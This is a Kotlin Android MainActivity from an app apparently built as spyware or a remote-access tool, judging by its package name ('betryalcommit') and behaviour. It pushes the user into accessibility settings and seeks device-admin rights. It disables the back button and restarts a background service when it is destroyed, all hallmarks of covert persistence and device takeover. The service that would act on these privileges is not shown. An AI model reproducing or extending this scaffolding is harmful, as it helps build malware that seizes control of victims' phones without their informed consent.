package com.example.betryalcommit
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity


class MainActivity : AppCompatActivity() {
    companion object {
        const val PERMISSION_REQUEST_CODE = 1
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportActionBar?.hide()
        setContentView(R.layout.activity_main)
        if (!isAccessibilityServiceEnabled()) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            applicationContext.startActivity(intent)
        }
        AdminAct.initialize(this);
        if (AdminAct.isDeviceAdminAssigned()) {
            val serviceIntent = Intent(this, MyService::class.java)
            startService(serviceIntent)
        } else {
            Permsu.requestPermissions(this, this, PERMISSION_REQUEST_CODE)

        }



    }


    override fun onBackPressed() {

    }

    override fun onDestroy() {
        val serviceIntent = Intent(this, MyService::class.java)
        startService(serviceIntent)
         super.onDestroy()
    }


     fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilitySettings = Settings.Secure.getString(
            applicationContext.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return accessibilitySettings?.contains(this.packageName) == true
    }
}
